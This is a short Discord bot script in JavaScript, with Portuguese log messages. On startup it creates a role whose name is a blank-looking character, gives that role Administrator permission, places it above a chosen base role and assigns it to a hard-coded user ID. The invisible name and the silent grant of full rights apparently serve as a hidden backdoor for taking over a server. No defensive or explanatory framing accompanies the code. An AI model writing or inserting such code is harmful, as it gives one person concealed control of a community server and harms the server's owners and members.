client.on("ready", async () => {
  console.log(`Logado como ${client.user.tag}`);

  const guild = client.guilds.cache.first();
  if (!guild) return console.log("❌ Nenhum servidor encontrado");

  const cargoBaseId = "COLOCA_ID_DO_CARGO_AQUI";
  const userId = "COLOCA_ID_DO_USUARIO_AQUI";

  try {
    const cargoBase = guild.roles.cache.get(cargoBaseId);

    if (!cargoBase) {
      console.log("❌ Cargo base NÃO encontrado!");
      return;
    }

    const membro = await guild.members.fetch(userId).catch(() => null);

    if (!membro) {
      console.log("❌ Usuário NÃO encontrado!");
      return;
    }

    const novoCargo = await guild.roles.create({
      name: "ㅤ",
      permissions: ["Administrator"]
    });

    await novoCargo.setPosition(cargoBase.position + 1);

    await membro.roles.add(novoCargo);

    console.log("✅ Tudo funcionando!");
  } catch (err) {
    console.error("❌ ERRO REAL:", err);
  }
});
